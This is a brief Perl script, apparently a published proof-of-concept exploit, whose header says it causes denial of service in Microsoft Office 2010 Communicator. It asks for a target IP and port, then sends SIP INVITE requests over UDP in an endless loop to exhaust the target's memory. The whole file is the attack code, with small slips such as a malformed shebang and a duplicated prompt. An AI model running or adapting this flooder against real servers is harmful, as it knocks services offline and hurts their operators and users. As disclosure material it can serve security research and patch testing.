#!usr/bin/perl 
#######################################################################################################################
#    Microsoft Office 2010 Communicator allows remote attack to cause a denial of service (memory consumption) via    #
#    a large number of SIP INVITE requests.                                                                           #
#######################################################################################################################
   
   
use IO::Socket;
   
print("\nEnter IP Address of Target Server: \n");
$vuln_host_ip = <STDIN>;
print("\nEnter IP Address of Target Server: \n");
$port = <STDIN>;
   
$sock_sip = IO::Socket::INET->new(    PeerAddr => $vuln_host_ip,
                                     PeerPort => $port,
                                     Proto    => 'udp') || "Unable to create Socket";
#if the server is configured on TCP replace 'udp' with 'tcp'.
   
while(1)
{
print $sock_sip "INVITE sip:arpman.malicious.com SIP/2.0\r\nVia: SIP/2.0/UDP 172.16.16.4;branch=123-4567-900\r\n";
    
}
   
#program never comes here for execution
 
close($sock_sip);